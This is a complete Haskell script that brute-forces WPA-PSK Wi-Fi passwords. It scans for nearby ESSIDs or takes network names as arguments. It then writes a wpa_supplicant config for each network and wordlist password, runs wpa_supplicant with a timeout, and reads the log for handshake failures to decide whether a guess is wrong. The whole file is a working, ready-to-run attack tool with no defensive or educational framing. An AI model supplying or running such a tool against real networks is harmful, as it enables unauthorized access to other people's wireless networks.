#!/usr/bin/env runhaskell

{-# LANGUAGE OverloadedStrings #-}
{-# LANGUAGE ExtendedDefaultRules #-}
{-# LANGUAGE NoImplicitPrelude #-}
{-# OPTIONS_GHC -fno-warn-type-defaults #-}

module Main where

import Control.Arrow

import Data.Maybe
import Data.Text
import Data.Text.IO
import Prelude (IO, (.), ($), fmap, Eq (..), Show (..)
    , return, sequence, (>>), (>>=), Bool (..), otherwise, Int, (*), div)
import qualified Prelude (filter, dropWhile, take, length)
import Shelly
import System.Environment
default (Text)

data Status = Right Text | Wrong Text | Error Text | Proceed Text deriving (Eq, Show)

timeout :: Int
timeout = 10

main :: IO ()
main = do
    (interface:passwordFile:freeArgs) <- (fmap . fmap $ pack) getArgs
    putStrLn "--- listing networks ---"
    runner "ip" ["link", "set", interface, "up"]
    
    networks <- case freeArgs of
            [] -> iwlist interface
            _  -> return freeArgs
    passwords <- (fmap lines) . readFile . unpack $ passwordFile

    let howManyNetworks = Prelude.length networks
    let howManyPasswords = Prelude.length passwords
    let howManyIterations = howManyNetworks * howManyPasswords
    let rawTiming = howManyIterations * timeout
    let humanTiming = rawTiming `div` 60

    putStrLn . concat $ [ "[ networks :: ", pack . show $ howManyNetworks, " ] "
                      , "[ passwords :: ", pack . show $ howManyPasswords, " ] "
                      , "[ total :: " , pack . show $ howManyIterations , " ]"
                      ]

    putStrLn . concat $ [ "Expected timing: ", pack . show $ humanTiming, " minutes." ]
    putStrLn "--- scan initiated ---"

    results <- sequence [ innerLoop interface network password
                        | network <- networks
                        , password <- passwords
                        ]
    putStrLn "--- scan completed ---"


innerLoop :: Text -> Text -> Text -> IO Text
innerLoop interface network password = report >> conf network password >>= supplicant interface
    where
    report = putStr . concat $ [ "[ ", network, " ] [ ", password, " ] -- " ]

runner cmd args = shelly . silently $ run cmd args

iwlist :: Text -> IO [Text]
iwlist interface = fmap parse output
    where
    output :: IO Text
    output = runner "iwlist" [interface, "scanning"]

    parse :: Text -> [Text]
    parse = lines
        >>> fmap stripStart
        >>> Prelude.filter (isPrefixOf "ESSID:")
        >>> fmap (drop 6)
        >>> fmap (drop 1 >>> dropEnd 1)

supplicant :: Text -> Text -> IO Text
supplicant interface conf = shelly . silently . (errExit False) $ do
    log <- fmap lines $ run "timeout"
        [ (pack.show) timeout
        , "wpa_supplicant"
        , "-P", concat [ "/run/wpa_supplicant_", interface, ".pid" ]
        , "-i", interface
        , "-D", "wext"
        , "-C", "/run/wpa_supplicant"
        , "-c", conf
        ]
    echo (evaluateInput log)
    return (evaluateInput log)

    where
    evaluateInput :: [Text] -> Text
    evaluateInput = fmap strategy
        >>> Prelude.take 10
        >>> Prelude.dropWhile (isProceed)
        >>> listToMaybe
        >>> maybe "No result!" (pack.show)

    isProceed (Proceed _) = True
    isProceed _ = False

    strategy :: Text -> Status
    strategy message
        | "4-Way Handshake failed" `isInfixOf` message = Wrong message
        | "timed out" `isInfixOf` message = Error message
        | "Association request to the driver failed" `isInfixOf` message = Error message
        | otherwise = Proceed message

conf :: Text -> Text -> IO Text
conf network password = do
    writeFile (unpack conf) text
    return conf
    where
    conf = "/tmp/wifi-bruteforce.tmp"
    text = concat
        [ "ctrl_interface=/run/wpa_supplicant\n"
        , "ctrl_interface_group=wheel\nnetwork={\n    key_mgmt=WPA-PSK\n    psk=\""
        , password
        , "\"\n    ssid=\""
        , network
        , "\"\n}"
        ]


